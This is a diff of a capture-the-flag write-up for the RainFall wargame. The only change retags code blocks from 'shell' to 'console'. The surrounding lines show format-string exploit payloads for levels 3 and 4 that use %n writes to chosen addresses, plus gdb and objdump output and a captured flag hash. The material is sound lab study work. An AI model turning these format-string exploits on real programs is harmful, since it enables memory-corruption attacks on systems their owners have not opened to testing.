@@ -384,7 +384,7 @@ Dump of assembler code for function v:
    0x08048519 <+117>:   ret    
 End of assembler dump.
 
-```shell
+```console
 level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08%x%x%x.........................................%n')" ; cat) | ./level3
 �200.b7fd1ac0.b7ff37d0.......................................
 Wait what?!
@@ -394,7 +394,7 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 
 ## level4
 
-```shell
+```console
 level4@RainFall:~$ objdump -t level4 | grep m
 level4:     file format elf32-i386
 080481b0 l    d  .dynsym        00000000              .dynsym
@@ -420,7 +420,7 @@ python -c "print('\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052s%n')" | ./level4
 
 ## level5
 
-```shell
+```console
 (gdb) disas n
 Dump of assembler code for function n:
 => 0x080484c2 <+0>:     push   ebp
@@ -440,13 +440,13 @@ Dump of assembler code for function n:
 End of assembler dump.
 ```
 
-```shell
+```console
 level5@RainFall:~$ objdump -t level5
 080484a4 g     F .text  0000001e              o
 08049854 g     O .bss   00000004              m
 ```
 
-```shell
+```console
 (gdb) p o
 $2 = {<text variable, no debug info>} 0x80484a4 (= 134513828) <o>
 ```
